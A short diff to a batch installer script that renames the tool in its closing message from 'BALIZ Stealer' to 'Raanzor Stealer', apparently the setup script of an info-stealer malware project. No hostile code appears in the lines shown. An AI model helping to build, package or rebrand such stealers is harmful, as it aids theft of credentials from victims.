@@ -39,7 +39,7 @@ setup.py install
 
 echo [#]---------------------------------------------------------------[#]
 echo                All Python dependencies are installed.
-echo                You can now launch your BALIZ Stealer.
+echo                You can now launch your Raanzor Stealer.
 echo [#]---------------------------------------------------------------[#]
 echo.
 pause>nul
